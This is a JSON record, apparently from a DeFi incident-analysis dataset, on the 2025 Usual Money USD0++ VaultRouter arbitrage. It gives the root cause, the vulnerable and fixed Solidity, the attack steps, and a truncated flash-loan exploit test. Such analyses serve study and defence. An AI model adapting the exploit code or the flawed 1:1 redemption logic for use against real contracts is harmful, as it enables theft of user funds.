@@ -1,0 +1,33 @@
+{
+ "id": "2025__2025-05-27_UsualMoney_VaultPriceArbitrage",
+ "source_file": "2025/2025-05-27_UsualMoney_VaultPriceArbitrage.md",
+ "title": "Usual Money — USD0++ Vault Price Arbitrage Analysis",
+ "date": "2025-05-27",
+ "protocol": "Usual Money",
+ "chain": "Ethereum",
+ "loss_raw": "43,000 USD",
+ "loss_usd": null,
+ "root_cause": "VaultRouter allowed swaps between USD0++ and sUSDS without slippage protection against price discrepancies, enabling profit extraction via large one-directional trades",
+ "attack_tx": "0x585d8be6...",
+ "vulnerable_contract": "0x35d8949372d46b7a3d5a56006ae77b215fc69bc0",
+ "classes": [
+  "staking-reward"
+ ],
+ "code_before": [
+  "❌ Vulnerable VaultRouter: internal/external price mismatch\ncontract VaultRouter {\n    ICurvePool constant curvePool = ICurvePool(USD0_USD0Plus_POOL);\n\n    function redeemUSD0PlusToSUSDS(uint256 usd0PlusAmount) external {\n        //",
+  "❌ Internal calculation uses 1:1 ratio but actual Curve price differs\n        uint256 susdSAmount = usd0PlusAmount; // internal: 1:1 (vulnerability)\n\n        IERC20(USD0Plus).transferFrom(msg.sender, address(this), usd0PlusAmount);\n        IERC20(sUSDS).transfer(msg.sender, susdSAmount);\n        //",
+  "❌ Arbitrage possible when actual sUSDS > USD0++ in value\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct code\nfunction redeemUSD0PlusToSUSDS(uint256 usd0PlusAmount) external {\n    uint256 usd0PlusMarketPrice = curvePool.get_dy(0, 1, usd0PlusAmount);\n    //",
+  "✅ Apply market-price-based exchange rate\n    uint256 susdSAmount = usd0PlusMarketPrice;\n    require(susdSAmount >= minReturn, \"Slippage too high\");\n    // ...\n}"
+ ],
+ "steps": [
+  "[3] ► Swap USD0++ → sUSDS via VaultRouter",
+  "[4] ► Re-swap sUSDS → USD0 → USD0++ via Curve pool"
+ ],
+ "other_code": [
+  "// File: Ownable.sol\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\n\npragma solidity ^0.8.20;\n\nimport {Context} from \"../utils/Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * The initial owner is set to the address provided by the deployer. This can\n * later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    /**\n     * @dev The caller account is not au",
+  "contract UsualMoney is BaseTestWithBalanceLog {\n    uint256 borrowAmount = 1899838465685386939269479;\n\n    function testExploit() public balanceLog {\n        // [1] Borrow USD0++ via Morpho flash loan\n        morphoBlue.flashLoan(\n            address(USD0Plus),\n            borrowAmount,\n            \"\"\n        );\n    }\n\n    function onMorphoFlashLoan(uint256 fee, bytes calldata data) external {\n        // [2] Create Uniswap V3 position (collateral structure)\n        USD0Plus.approve(address(UNI_V3_POS), type(uint256).max);\n        USDC.approve(address(UNI_V3_POS), type(uint256).max);\n        (uniV3TokenId,,,) = UNI_V3_POS.mint(\n            INonfungiblePositionManager.MintParams({\n                token0: address(USD0Plus),\n                token1: address(USDC),\n                // ...\n       "
+ ]
+}
